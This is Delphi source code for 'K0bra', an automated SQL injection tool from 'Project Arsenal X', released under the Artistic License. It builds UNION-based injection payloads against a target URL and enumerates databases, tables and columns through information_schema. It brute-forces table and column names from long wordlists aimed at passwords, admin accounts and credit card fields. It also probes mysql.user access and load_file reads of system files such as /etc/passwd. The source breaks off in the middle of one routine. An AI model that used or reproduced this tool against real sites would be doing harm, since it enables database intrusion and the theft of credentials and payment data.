{
  This software is Copyright (c) 2015 by Doddy Hackman.

  This is free software, licensed under:

  The Artistic License 2.0

  The Artistic License

  Preamble

  This license establishes the terms under which a given free software Package may be copied, modified, distributed, and/or redistributed. The intent is that the Copyright Holder maintains some artistic control over the development of that Package while still keeping the Package available as open source and free software.
  You are always permitted to make arrangements wholly outside of this license directly with the Copyright Holder of a given Package. If the terms of this license do not permit the full use that you propose to make of the Package, you should contact the Copyright Holder and seek a different licensing arrangement.

  Definitions

  "Copyright Holder" means the individual(s) or organization(s) named in the copyright notice for the entire Package.
  "Contributor" means any party that has contributed code or other material to the Package, in accordance with the Copyright Holder's procedures.
  "You" and "your" means any person who would like to copy, distribute, or modify the Package.
  "Package" means the collection of files distributed by the Copyright Holder, and derivatives of that collection and/or of those files. A given Package may consist of either the Standard Version, or a Modified Version.
  "Distribute" means providing a copy of the Package or making it accessible to anyone else, or in the case of a company or organization, to others outside of your company or organization.
  "Distributor Fee" means any fee that you charge for Distributing this Package or providing support for this Package to another party. It does not mean licensing fees.
  "Standard Version" refers to the Package if it has not been modified, or has been modified only in ways explicitly requested by the Copyright Holder.
  "Modified Version" means the Package, if it has been changed, and such changes were not explicitly requested by the Copyright Holder.
  "Original License" means this Artistic License as Distributed with the Standard Version of the Package, in its current version or as it may be modified by The Perl Foundation in the future.
  "Source" form means the source code, documentation source, and configuration files for the Package.
  "Compiled" form means the compiled bytecode, object code, binary, or any other form resulting from mechanical transformation or translation of the Source form.

  Permission for Use and Modification Without Distribution

  (1) You are permitted to use the Standard Version and create and use Modified Versions for any purpose without restriction, provided that you do not Distribute the Modified Version.

  Permissions for Redistribution of the Standard Version

  (2) You may Distribute verbatim copies of the Source form of the Standard Version of this Package in any medium without restriction, either gratis or for a Distributor Fee, provided that you duplicate all of the original copyright notices and associated disclaimers. At your discretion, such verbatim copies may or may not include a Compiled form of the Package.
  (3) You may apply any bug fixes, portability changes, and other modifications made available from the Copyright Holder. The resulting Package will still be considered the Standard Version, and as such will be subject to the Original License.

  Distribution of Modified Versions of the Package as Source

  (4) You may Distribute your Modified Version as Source (either gratis or for a Distributor Fee, and with or without a Compiled form of the Modified Version) provided that you clearly document how it differs from the Standard Version, including, but not limited to, documenting any non-standard features, executables, or modules, and provided that you do at least ONE of the following:
  (a) make the Modified Version available to the Copyright Holder of the Standard Version, under the Original License, so that the Copyright Holder may include your modifications in the Standard Version.
  (b) ensure that installation of your Modified Version does not prevent the user installing or running the Standard Version. In addition, the Modified Version must bear a name that is different from the name of the Standard Version.
  (c) allow anyone who receives a copy of the Modified Version to make the Source form of the Modified Version available to others under
  (i) the Original License or
  (ii) a license that permits the licensee to freely copy, modify and redistribute the Modified Version using the same licensing terms that apply to the copy that the licensee received, and requires that the Source form of the Modified Version, and of any works derived from it, be made freely available in that license fees are prohibited but Distributor Fees are allowed.
  Distribution of Compiled Forms of the Standard Version or Modified Versions without the Source

  (5) You may Distribute Compiled forms of the Standard Version without the Source, provided that you include complete instructions on how to get the Source of the Standard Version. Such instructions must be valid at the time of your distribution. If these instructions, at any time while you are carrying out such distribution, become invalid, you must provide new instructions on demand or cease further distribution. If you provide valid instructions or cease distribution within thirty days after you become aware that the instructions are invalid, then you do not forfeit any of your rights under this license.
  (6) You may Distribute a Modified Version in Compiled form without the Source, provided that you comply with Section 4 with respect to the Source of the Modified Version.

  Aggregating or Linking the Package

  (7) You may aggregate the Package (either the Standard Version or Modified Version) with other packages and Distribute the resulting aggregation provided that you do not charge a licensing fee for the Package. Distributor Fees are permitted, and licensing fees for other components in the aggregation are permitted. The terms of this license apply to the use and Distribution of the Standard or Modified Versions as included in the aggregation.
  (8) You are permitted to link Modified and Standard Versions with other works, to embed the Package in a larger work of your own, or to build stand-alone binary or bytecode versions of applications that include the Package, and Distribute the result without restriction, provided the result does not expose a direct interface to the Package.

  Items That are Not Considered Part of a Modified Version

  (9) Works (including, but not limited to, modules and scripts) that merely extend or make use of the Package, do not, by themselves, cause the Package to be a Modified Version. In addition, such works are not considered parts of the Package itself, and are not subject to the terms of this license.

  General Provisions

  (10) Any use, modification, and distribution of the Standard or Modified Versions is governed by this Artistic License. By using, modifying or distributing the Package, you accept this license. Do not use, modify, or distribute the Package, if you do not accept this license.
  (11) If your Modified Version has been derived from a Modified Version made by someone other than you, you are nevertheless required to ensure that your Modified Version complies with the requirements of this license.
  (12) This license does not grant you the right to use any trademark, service mark, tradename, or logo of the Copyright Holder.
  (13) This license includes the non-exclusive, worldwide, free-of-charge patent license to make, have made, use, offer to sell, sell, import and otherwise transfer the Package with respect to any patent claims licensable by the Copyright Holder that are necessarily infringed by the Package. If you institute patent litigation (including a cross-claim or counterclaim) against any party alleging that the Package constitutes direct or contributory patent infringement, then this Artistic License to you shall terminate on the date that such litigation is filed.
  (14) Disclaimer of Warranty: THE PACKAGE IS PROVIDED BY THE COPYRIGHT HOLDER AND CONTRIBUTORS "AS IS' AND WITHOUT ANY EXPRESS OR IMPLIED WARRANTIES. THE IMPLIED WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, OR NON-INFRINGEMENT ARE DISCLAIMED TO THE EXTENT PERMITTED BY YOUR LOCAL LAW. UNLESS REQUIRED BY LAW, NO COPYRIGHT HOLDER OR CONTRIBUTOR WILL BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, OR CONSEQUENTIAL DAMAGES ARISING IN ANY WAY OUT OF THE USE OF THE PACKAGE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

}

// Project Arsenal X 0.2
// (C) Doddy Hackman 2015

unit form_kobra;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, sButton, sEdit, sGroupBox, sSkinManager, IdBaseComponent,
  IdComponent, IdTCPConnection, IdTCPClient, IdHTTP, ComCtrls,
  sStatusBar, sMemo, sListBox, sLabel, mysqluser, dumper, loadfile, shell, jpeg,
  ExtCtrls, idURI, ShellApi, PerlRegex;

type
  Tkobra = class(TForm)
    sGroupBox1: TsGroupBox;
    txtTarget: TsEdit;
    btnScan: TsButton;
    status: TsStatusBar;
    sGroupBox2: TsGroupBox;
    btnDatabases: TsButton;
    sGroupBox3: TsGroupBox;
    lstDetails: TsMemo;
    sGroupBox4: TsGroupBox;
    lstDatabases: TsListBox;
    sLabel1: TsLabel;
    lstTables: TsListBox;
    lstColumns: TsListBox;
    sLabel2: TsLabel;
    sLabel3: TsLabel;
    btnTables: TsButton;
    btnColumns: TsButton;
    btnUsers: TsButton;
    btnDump: TsButton;
    btnFuzzTables: TsButton;
    btnFuzzColumns: TsButton;
    btnFile: TsButton;
    btnLogs: TsButton;
    nave: TIdHTTP;
    btnDetails: TsButton;
    btnShell: TsButton;
    procedure btnScanClick(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btnFuzzTablesClick(Sender: TObject);
    procedure btnFuzzColumnsClick(Sender: TObject);
    procedure btnDetailsClick(Sender: TObject);
    procedure btnDatabasesClick(Sender: TObject);
    procedure btnTablesClick(Sender: TObject);
    procedure btnColumnsClick(Sender: TObject);
    procedure btnUsersClick(Sender: TObject);
    procedure btnDumpClick(Sender: TObject);
    procedure btnFileClick(Sender: TObject);
    procedure btnShellClick(Sender: TObject);
    procedure btnLogsClick(Sender: TObject);

    { Private declarations }
  public
    { Public declarations }
  end;

var
  kobra: Tkobra;

const
  buscar1: array [1 .. 436] of string = ('usuario', 'web_users', 'name',
    'names', 'nombre', 'nombres', 'usuarios', 'member', 'members',
    'admin_table', 'usuaris', 'admin', 'tblUsers', 'tblAdmin', 'user', 'users',
    'username', 'usernames', 'web_usuarios', 'miembro', 'miembros',
    'membername', 'admins', 'administrator', 'sign', 'config', 'USUARIS',
    'cms_operadores', 'administrators', 'passwd', 'password', 'passwords',
    'pass', 'Pass', 'mpn_authors', 'author', 'musuario', 'mysql.user',
    'user_names', 'foro', 'tAdmin', 'tadmin', 'user_password', 'user_passwords',
    'user_name', 'member_password', 'mods', 'mod', 'moderators', 'moderator',
    'user_email', 'jos_users', 'mb_user', 'host', 'apellido_nombre',
    'user_emails', 'user_mail', 'user_mails', 'mail', 'emails', 'email',
    'address', 'jos_usuarios', 'tutorial_user_auth', 'e-mail', 'emailaddress',
    'correo', 'correos', 'phpbb_users', 'log', 'logins', 'login',
    'tbl_usuarios', 'user_auth', 'login_radio', 'registers', 'register', 'usr',
    'usrs', 'ps', 'pw', 'un', 'u_name', 'u_pass', 'tbl_admin', 'usuarios_head',
    'tpassword', 'tPassword', 'u_password', 'nick', 'nicks', 'manager',
    'managers', 'administrador', 'BG_CMS_Users', 'tUser', 'tUsers',
    'administradores', 'clave', 'login_id', 'pwd', 'pas', 'sistema_id',
    'foro_usuarios', 'cliente', 'sistema_usuario', 'sistema_password',
    'contrasena', 'auth', 'key', 'senha', 'signin', 'dir_admin', 'alias',
    'clientes', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_logon',
    'tb_members_tb_member', 'calendar_users', 'cursos', 'tb_users', 'tb_user',
    'tb_sys', 'sys', 'fazerlogon', 'logon', 'fazer', 'authorization', 'curso',
    'membros', 'utilizadores', 'staff', 'nuke_authors', 'accounts', 'account',
    'accnts', 'signup', 'leads', 'lead', 'associated', 'accnt', 'customers',
    'customer', 'membres', 'administrateur', 'utilisateur', 'riacms_users',
    'tuser', 'tusers', 'utilisateurs', 'amministratore', 'god', 'God',
    'authors', 'wp_users', 'tb_usuarios', 'asociado', 'asociados', 'autores',
    'autor', 'Users', 'Admin', 'Members', 'tb_usuario', 'Miembros', 'Usuario',
    'Usuarios', 'ADMIN', 'USERS', 'USER', 'MEMBER', 'MEMBERS', 'USUARIO',
    'USUARIOS', 'MIEMBROS', 'MIEMBRO', 'USR_NAME', 'about', 'access',
    'admin_id', 'admin_name', 'admin_pass', 'admin_passwd', 'admin_password',
    'admin_pwd', 'admin_user', 'admin_userid', 'admin_username', 'adminemail',
    'adminid', 'administrator_name', 'adminlogin', 'adminmail', 'adminname',
    'adminuser', 'adminuserid', 'adminusername', 'aid', 'aim', 'apwd', 'auid',
    'authenticate', 'authentication', 'blog', 'cc_expires', 'cc_number',
    'cc_owner', 'cc_type', 'cfg', 'cid', 'clientname', 'clientpassword',
    'clientusername', 'conf', 'contact', 'converge_pass_hash',
    'converge_pass_salt', 'crack', 'customers_email_address',
    'customers_password', 'cvvnumber]', 'data', 'db_database_name',
    'db_hostname', 'db_password', 'db_username', 'download', 'e_mail', 'emer',
    'emni', 'emniplote', 'emri', 'fjalekalimi', 'fjalekalimin', 'full', 'gid',
    'group', 'group_name', 'hash', 'hashsalt', 'homepage', 'icq', 'icq_number',
    'id', 'id_group', 'id_member', 'images', 'ime', 'index', 'ip_address',
    'kodi', 'korisnici', 'korisnik', 'kpro_user', 'last_ip', 'last_login',
    'lastname', 'llogaria', 'login_admin', 'login_name', 'login_pass',
    'login_passwd', 'login_password', 'login_pw', 'login_pwd', 'login_user',
    'login_username', 'logini', 'loginkey', 'loginout', 'logo', 'logohu',
    'lozinka', 'md5hash', 'mem_login', 'mem_pass', 'mem_passwd', 'mem_password',
    'mem_pwd', 'member_id', 'member_login_key', 'member_name', 'memberid',
    'memlogin', 'mempassword', 'my_email', 'my_name', 'my_password',
    'my_username', 'myname', 'mypassword', 'myusername', 'nc', 'new', 'news',
    'number', 'nummer', 'p_assword', 'p_word', 'pass_hash', 'pass_w',
    'pass_word', 'pass1word', 'passw', 'passwordsalt', 'passwort', 'passwrd',
    'perdorimi', 'perdoruesi', 'personal_key', 'phone', 'privacy', 'psw',
    'punetoret', 'punonjes', 'pword', 'pwrd', 'salt', 'search', 'secretanswer',
    'secretquestion', 'serial', 'session_member_id', 'session_member_login_key',
    'sesskey', 'setting', 'sid', 'sifra', 'spacer', 'status', 'store', 'store1',
    'store2', 'store3', 'store4', 'table_prefix', 'temp_pass', 'temp_password',
    'temppass', 'temppasword', 'text', 'uid', 'uname', 'user_admin', 'user_icq',
    'user_id', 'user_ip', 'user_level', 'user_login', 'user_n', 'user_pass',
    'user_passw', 'user_passwd', 'user_pw', 'user_pwd', 'user_pword',
    'user_pwrd', 'user_un', 'user_uname', 'user_username', 'user_usernm',
    'user_usernun', 'user_usrnm', 'user1', 'useradmin', 'userid', 'userip',
    'userlogin', 'usern', 'usernm', 'userpass', 'userpassword', 'userpw',
    'userpwd', 'usr_n', 'usr_name', 'usr_pass', 'usr2', 'usrn', 'usrnam',
    'usrname', 'usrnm', 'usrpass', 'warez', 'xar_name', 'xar_pass',
    'nom dutilisateur', 'mot de passe', 'compte', 'comptes', 'aide', 'objectif',
    'authentifier', 'authentification', 'Contact', 'fissure', 'client',
    'clients', 'de donn?es', 'mot_de_passe_bdd', 't?l?charger', 'E-mail',
    'adresse e-mail', 'Emer', 'complet', 'groupe', 'hachage', 'Page daccueil',
    'Kodi', 'nom', 'connexion', 'membre', 'MEMBERNAME', 'mon_mot_de_passe',
    'monmotdepasse', 'ignatiusj', 'caroline-du-nord', 'nouveau', 'Nick',
    'passer', 'Passw', 'Mot de passe', 't?l?phone',
    'protection de la vie priv?e', 'PSW', 'pWord', 'sel', 'recherche',
    'de s?rie', 'param?tre', '?tat', 'stocker', 'texte', 'cvvnumber');

const
  buscar2: array [1 .. 422] of string = ('name', 'user', 'user_name',
    'user_username', 'uname', 'user_uname', 'usern', 'user_usern', 'un',
    'user_un', 'mail', 'cliente', 'usrnm', 'user_usrnm', 'usr', 'admin_name',
    'cla_adm', 'usu_adm', 'fazer', 'logon', 'fazerlogon', 'authorization',
    'membros', 'utilizadores', 'sysadmin', 'email', 'senha', 'username',
    'usernm', 'user_usernm', 'nm', 'user_nm', 'login', 'u_name', 'nombre',
    'host', 'pws', 'cedula', 'userName', 'host_password', 'chave', 'alias',
    'apellido_nombre', 'cliente_nombre', 'cliente_email', 'cliente_pass',
    'cliente_user', 'cliente_usuario', 'login_id', 'sistema_id', 'author',
    'user_login', 'admin_user', 'admin_pass', 'uh_usuario', 'uh_password',
    'psw', 'host_username', 'sistema_usuario', 'auth', 'key', 'usuarios_nombre',
    'usuarios_nick', 'usuarios_password', 'user_clave', 'membername', 'nme',
    'unme', 'password', 'user_password', 'autores', 'pass_hash', 'hash', 'pass',
    'correo', 'usuario_nombre', 'usuario_nick', 'usuario_password', 'userpass',
    'user_pass', 'upw', 'pword', 'user_pword', 'passwd', 'user_passwd', 'passw',
    'user_passw', 'pwrd', 'user_pwrd', 'pwd', 'authors', 'user_pwd', 'u_pass',
    'clave', 'usuario', 'contrasena', 'pas', 'sistema_password', 'autor',
    'upassword', 'web_password', 'web_username', 'tbladmins', 'sort',
    '_wfspro_admin', '4images_users', 'a_admin', 'account', 'accounts', 'adm',
    'admin', 'admin_login', 'admin_userinfo', 'administer', 'administrable',
    'administrate', 'administration', 'administrator', 'administrators',
    'adminrights', 'admins', 'adminuser', 'art', 'article_admin', 'articles',
    'artikel', 'ÃÜÂë', 'aut', 'autore', 'backend', 'backend_users',
    'backenduser', 'bbs', 'book', 'chat_config', 'chat_messages', 'chat_users',
    'client', 'clients', 'clubconfig', 'company', 'config', 'contact',
    'contacts', 'content', 'control', 'cpg_config', 'cpg132_users', 'customer',
    'customers', 'customers_basket', 'dbadmins', 'dealer', 'dealers', 'diary',
    'download', 'Dragon_users', 'e107.e107_user', 'e107_user',
    'forum.ibf_members', 'fusion_user_groups', 'fusion_users', 'group',
    'groups', 'ibf_admin_sessions', 'ibf_conf_settings', 'ibf_members',
    'ibf_members_converge', 'ibf_sessions', 'icq', 'images', 'index', 'info',
    'ipb.ibf_members', 'ipb_sessions', 'joomla_users', 'jos_blastchatc_users',
    'jos_comprofiler_members', 'jos_contact_details', 'jos_joomblog_users',
    'jos_messages_cfg', 'jos_moschat_users', 'jos_users', 'knews_lostpass',
    'korisnici', 'kpro_adminlogs', 'kpro_user', 'links', 'login_admin',
    'login_admins', 'login_user', 'login_users', 'logins', 'logs', 'lost_pass',
    'lost_passwords', 'lostpass', 'lostpasswords', 'm_admin', 'main',
    'mambo_session', 'mambo_users', 'manage', 'manager', 'mb_users', 'member',
    'memberlist', 'members', 'minibbtable_users', 'mitglieder', 'movie',
    'movies', 'mybb_users', 'mysql', 'mysql.user', 'names', 'news',
    'news_lostpass', 'newsletter', 'nuke_authors', 'nuke_bbconfig',
    'nuke_config', 'nuke_popsettings', 'nuke_users', 'ÓÃ»§', 'obb_profiles',
    'order', 'orders', 'parol', 'partner', 'partners', 'passes', 'passwords',
    'perdorues', 'perdoruesit', 'phorum_session', 'phorum_user', 'phorum_users',
    'phpads_clients', 'phpads_config', 'phpbb_users', 'phpBB2.forum_users',
    'phpBB2.phpbb_users', 'phpmyadmin.pma_table_info', 'pma_table_info',
    'poll_user', 'punbb_users', 'pwds', 'reg_user', 'reg_users', 'registered',
    'reguser', 'regusers', 'session', 'sessions', 'settings', 'shop.cards',
    'shop.orders', 'site_login', 'site_logins', 'sitelogin', 'sitelogins',
    'sites', 'smallnuke_members', 'smf_members', 'SS_orders', 'statistics',
    'superuser', 'sysadmins', 'system', 'sysuser', 'sysusers', 'table',
    'tables', 'tb_admin', 'tb_administrator', 'tb_login', 'tb_member',
    'tb_members', 'tb_user', 'tb_username', 'tb_usernames', 'tb_users', 'tbl',
    'tbl_user', 'tbl_users', 'tbluser', 'tbl_clients', 'tbl_client',
    'tblclients', 'tblclient', 'test', 'usebb_members', 'user_admin',
    'user_info', 'user_list', 'user_logins', 'user_names', 'usercontrol',
    'userinfo', 'userlist', 'userlogins', 'usernames', 'userrights', 'users',
    'vb_user', 'vbulletin_session', 'vbulletin_user', 'voodoo_members',
    'webadmin', 'webadmins', 'webmaster', 'webmasters', 'webuser', 'webusers',
    'x_admin', 'xar_roles', 'xoops_bannerclient', 'xoops_users',
    'yabb_settings', 'yabbse_settings', 'ACT_INFO', 'ActiveDataFeed',
    'Category', 'CategoryGroup', 'ChicksPass', 'ClickTrack', 'Country',
    'CountryCodes1', 'CustomNav', 'DataFeedPerformance1',
    'DataFeedPerformance2', 'DataFeedPerformance2_incoming', 'DataFeedShowtag1',
    'DataFeedShowtag2', 'DataFeedShowtag2_incoming', 'dtproperties', 'Event',
    'Event_backup', 'Event_Category', 'EventRedirect', 'Events_new', 'Genre',
    'JamPass', 'MyTicketek', 'MyTicketekArchive', 'News', 'PerfPassword',
    'PerfPasswordAllSelected', 'Promotion', 'ProxyDataFeedPerformance',
    'ProxyDataFeedShowtag', 'ProxyPriceInfo', 'Region', 'SearchOptions',
    'Series', 'Sheldonshows', 'StateList', 'States', 'SubCategory', 'Subjects',
    'Survey', 'SurveyAnswer', 'SurveyAnswerOpen', 'SurveyQuestion',
    'SurveyRespondent', 'sysconstraints', 'syssegments',
    'tblRestrictedPasswords', 'tblRestrictedShows', 'TimeDiff', 'Titles',
    'ToPacmail1', 'ToPacmail2', 'UserPreferences', 'uvw_Category', 'uvw_Pref',
    'uvw_Preferences', 'Venue', 'venues', 'VenuesNew', 'X_3945',
    'tblArtistCategory', 'tblArtists', 'tblConfigs', 'tblLayouts',
    'tblLogBookAuthor', 'tblLogBookEntry', 'tblLogBookImages',
    'tblLogBookImport', 'tblLogBookUser', 'tblMails', 'tblNewCategory',
    'tblNews', 'tblOrders', 'tblStoneCategory', 'tblStones', 'tblUser',
    'tblWishList', 'VIEW1', 'viewLogBookEntry', 'viewStoneArtist',
    'vwListAllAvailable', 'CC_info', 'CC_username', 'cms_user', 'cms_users',
    'cms_admin', 'cms_admins', 'jos_user', 'table_user', 'bulletin', 'cc_info',
    'login_name', 'admuserinfo', 'userlistuser_list', 'SiteLogin', 'Site_Login',
    'UserAdmin', 'Admins', 'Login', 'Logins');

implementation

{$R *.dfm}

function encodehex(text: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
begin
  for num := 1 to length(text) do
  begin
    result := result + IntToHex(ord(text[num]), 2);
  end;
end;

procedure savefile(filename, texto: string);
var
  ar: TextFile;
  urlex: TIdURI;
begin

  urlex := TIdURI.Create(filename);

  AssignFile(ar, urlex.Host + '.txt');
  FileMode := fmOpenWrite;

  if FileExists(urlex.Host + '.txt') then
    Append(ar)
  else
    Rewrite(ar);

  Writeln(ar, texto);
  CloseFile(ar);

end;

procedure Tkobra.btnDumpClick(Sender: TObject);
begin
  form_dumper.Show;
end;

procedure Tkobra.FormCreate(Sender: TObject);
var
  dir: string;
begin

  dir := ExtractFilePath(Application.ExeName) + '/logs';

  if not(DirectoryExists(dir)) then
  begin
    CreateDir(dir);
  end;

  ChDir(dir);

end;

procedure Tkobra.btnFuzzColumnsClick(Sender: TObject);
var
  target: string;
  i: integer;
  code: string;
  pass1: string;
  pass2: string;
  web1: string;
  parte1: string;
  parte2: string;
  regex: TPerlRegEx;
begin

  if (txtTarget.text = '') or not(lstTables.ItemIndex >= 0) then
  begin
    MessageBox(0, Pchar('Write Target and select a table'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end
  else
  begin
    target := txtTarget.text;
    pass1 := '+';
    pass2 := '--';

    regex := TPerlRegEx.Create();

    regex.regex := '(.*)hackman(.*)';
    regex.Subject := txtTarget.text;

    if regex.Match then
    begin

      parte1 := regex.Groups[1];
      parte2 := regex.Groups[2];

      status.Panels[0].text := '[+] Fuzzing columns ...';
      kobra.status.Update;
      savefile(txtTarget.text, '');
      for i := Low(buscar2) to High(buscar2) do
      begin

        status.Panels[0].text := '[+] Fuzzing column : ' + buscar2[i];
        kobra.status.Update;

        code := nave.Get
          (parte1 + 'unhex(hex(concat(char(69,82,84,79,82,56,53,52),' +
          buscar2[i] + ',char(69,82,84,79,82,56,53,52))))' + parte2 + pass1 +
          'from' + pass1 + lstTables.Items.Strings[lstTables.ItemIndex]
          + pass2);

        regex.regex := 'ERTOR854';
        regex.Subject := code;

        if regex.Match then
        begin
          lstColumns.Update;
          lstColumns.Items.Add(buscar2[i]);
          savefile(txtTarget.text, '[+] Table : ' + lstTables.Items.Strings
            [lstTables.ItemIndex] + ' [+] Column : ' + buscar2[i]);
        end;
      end;
      status.Panels[0].text := '[+] Done';
      kobra.status.Update;
    end;

    regex.Free;
  end;

end;

procedure Tkobra.btnFuzzTablesClick(Sender: TObject);
var
  target: string;
  i: integer;
  code: string;
  pass1: string;
  pass2: string;
  web1: string;
  regex: TPerlRegEx;
begin
  if not(txtTarget.text = '') then
  begin
    target := txtTarget.text;
    pass1 := '+';
    pass2 := '--';

    regex := TPerlRegEx.Create();

    lstTables.Clear;

    web1 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(char(69,82,84,79,82,56,53,52))))', []);

    status.Panels[0].text := '[+] Fuzzing tables ...';
    kobra.status.Update;
    savefile(txtTarget.text, '');
    for i := Low(buscar1) to High(buscar1) do
    begin

      status.Panels[0].text := '[+] Fuzzing table : ' + buscar1[i];
      kobra.status.Update;

      code := nave.Get(web1 + pass1 + 'from' + pass1 + buscar1[i] + pass2);

      regex.regex := 'ERTOR854';
      regex.Subject := code;

      if regex.Match then
      begin
        lstTables.Update;
        lstTables.Items.Add(buscar1[i]);
        savefile(txtTarget.text, '[+] Table : ' + buscar1[i]);

      end;

      status.Panels[0].text := '[+] Done';
      kobra.status.Update;

    end;

    regex.Free;
  end
  else
  begin
    MessageBox(0, Pchar('Write Target'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end;
end;

procedure Tkobra.btnColumnsClick(Sender: TObject);
var
  target: string;
  pass1: string;
  pass2: string;
  web1: string;
  web2: string;
  i: integer;
  rows: integer;
  code: string;
  tabx: string;
  data: string;
  regex: TPerlRegEx;
begin

  if (txtTarget.text = '') or not(lstTables.ItemIndex >= 0) then
  begin
    MessageBox(0, Pchar('Write Target and select a table'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end
  else
  begin
    target := txtTarget.text;
    lstColumns.Clear;
    regex := TPerlRegEx.Create();
    pass1 := '+';
    pass2 := '--';

    data := '0x' + encodehex(lstDatabases.Items.Strings
      [lstDatabases.ItemIndex]);
    tabx := '0x' + encodehex(lstTables.Items.Strings[lstTables.ItemIndex]);

    web1 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))', []);
    web2 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,column_name,0x4b30425241)))', []);

    status.Panels[0].text := '[+] Getting columns ...';
    kobra.status.Update;

    code := nave.Get(web1 + pass1 + 'from' + pass1 +
      'information_schema.columns' + pass1 + 'where' + pass1 + 'table_name=' +
      tabx + pass1 + 'and' + pass1 + 'table_schema=' + data + pass2);

    regex.regex := 'K0BRA(.*?)K0BRA';
    regex.Subject := code;

    if regex.Match then
    begin
      savefile(txtTarget.text, '');
      rows := StrToInt(regex.Groups[1]);
      for i := 0 to rows do
      begin

        status.Panels[0].text := '[+] Getting column : ' + IntToStr(i);
        kobra.status.Update;

        code := nave.Get(web2 + pass1 + 'from' + pass1 +
          'information_schema.columns' + pass1 + 'where' + pass1 + 'table_name='
          + tabx + pass1 + 'and' + pass1 + 'table_schema=' + data + pass1 +
          'limit' + pass1 + IntToStr(i) + ',1' + pass2);

        regex.regex := 'K0BRA(.*?)K0BRA';
        regex.Subject := code;

        if regex.Match then
        begin
          savefile(txtTarget.text, '[+] Database : ' +
            lstDatabases.Items.Strings[lstDatabases.ItemIndex] + ' [+] Table : '
            + lstTables.Items.Strings[lstTables.ItemIndex] + ' [+] Column : ' +
            regex.Groups[1]);
          lstColumns.Update;
          lstColumns.Items.Add(regex.Groups[1]);
        end;
      end;
      status.Panels[0].text := '[+] Done';
      kobra.status.Update;
    end
    else
    begin
      status.Panels[0].text := '[-] Columns not found';
      kobra.status.Update;
    end;

    regex.Free;

  end;
end;

procedure Tkobra.btnDatabasesClick(Sender: TObject);
var
  target: string;
  pass1: string;
  pass2: string;
  code: string;
  web1: string;
  web2: string;
  i: integer;
  rows: integer;
  regex: TPerlRegEx;
begin

  if not(txtTarget.text = '') then
  begin

    target := txtTarget.text;
    pass1 := '+';
    pass2 := '--';

    lstDatabases.Clear;

    regex := TPerlRegEx.Create();

    web1 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,count(*),0x4b30425241)))', []);
    web2 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(0x4b30425241,schema_name,0x4b30425241)))', []);

    status.Panels[0].text := '[+] Getting databases ...';
    kobra.status.Update;

    code := nave.Get(web1 + pass1 + 'from' + pass1 +
      'information_schema.schemata' + pass2);

    regex.regex := 'K0BRA(.*?)K0BRA';
    regex.Subject := code;

    if regex.Match then
    begin
      savefile(txtTarget.text, '');
      rows := StrToInt(regex.Groups[1]);
      for i := 0 to rows + 1 do
      begin
        status.Panels[0].text := '[+] Getting database : ' + IntToStr(i);
        kobra.status.Update;
        code := nave.Get(web2 + pass1 + 'from' + pass1 +
          'information_schema.schemata' + pass1 + 'limit' + pass1 + IntToStr(i)
          + ',1' + pass2);
        regex.regex := 'K0BRA(.*?)K0BRA';
        regex.Subject := code;
        if regex.Match then
        begin
          savefile(txtTarget.text, '[+] Database : ' + regex.Groups[1]);
          lstDatabases.Update;
          lstDatabases.Items.Add(regex.Groups[1]);
        end;
      end;
      status.Panels[0].text := '[+] Done';
      kobra.status.Update;
    end
    else
    begin
      status.Panels[0].text := '[-] Databases not found';
      kobra.status.Update;
    end;

    regex.Free;
  end
  else
  begin
    MessageBox(0, Pchar('Write Target'), Pchar('K0bra 1.0'),
      MB_ICONINFORMATION);
  end;

end;

procedure Tkobra.btnDetailsClick(Sender: TObject);
var
  target: string;
  pass1: string;
  pass2: string;
  hextest: string;
  web1: string;
  web2: string;
  web3: string;
  code: string;
  regex: TPerlRegEx;

begin

  if not(txtTarget.text = '') then
  begin

    target := txtTarget.text;
    pass1 := '+';
    pass2 := '--';

    regex := TPerlRegEx.Create();

    lstDetails.Lines.Clear;

    hextest := '0x2f6574632f706173737764'; // /etc/passwd
    hextest := '0x633A2F78616D70702F726561642E747874'; // #c:/xampp/read.txt

    web1 := StringReplace(txtTarget.text, 'hackman', '0x4b30425241', []);
    web2 := StringReplace(txtTarget.text, 'hackman',
      'concat(0x4b30425241,user(),0x4b30425241,database(),0x4b30425241,version(),0x4b30425241)',
      []);
    web3 := StringReplace(txtTarget.text, 'hackman',
      'unhex(hex(concat(char(69,82,84,79,82,56,53,52),load_file(' + hextest +
      '))))', []);

    status.Panels[0].text := '[+] Getting more data ...';
    kobra.status.Update;

    code := nave.Get(web1 + pass1 + 'from' + pass1 + 'mysql.user' + pass2);
    regex.regex := 'K0BRA';
    regex.Subject := code;
    if regex.Match then
    begin
      lstDetails.Lines.Add('[+] mysqluser : ON');
      savefile(txtTarget.text, '[+] mysqluser : ON');
    end
    else
    begin
      lstDetails.Lines.Add('[+] mysqluser : OFF');
    end;

    code := nave.Get(web1 + pass1 + 'from' + pass1 +
      'information_schema.tables' + pass2);
    regex.regex := 'K0BRA';
    regex.Subject := code;
    if regex.Match then
    begin
      lstDetails.Lines.Add('[+] information_schema.tables : ON');
      savefile(txtTarget.text, '[+] information_schema.tables : ON');
    end
    else
    begin
      lstDetails.Lines.Add('[+] information_schema.tables : OFF');
    end;

    code := nave.Get(web3);
    regex.regex := 'K0BRA';
    regex.Subject := code;
    if regex.Match then
    begin
      lstDetails.Lines.Add('[+] load_file : ON');
      savefile(txtTarget.text, '[+] load_file : ON');
    end
    else
    begin
      lstDetails.Lines.Add('[+] load_file : OFF');
    end;

    lstDetails.Lines.Add('');

    status.Panels[0].text := '[+] Getting DB details ...';
    kobra.status.Update;

    code := nave.Get(web2);

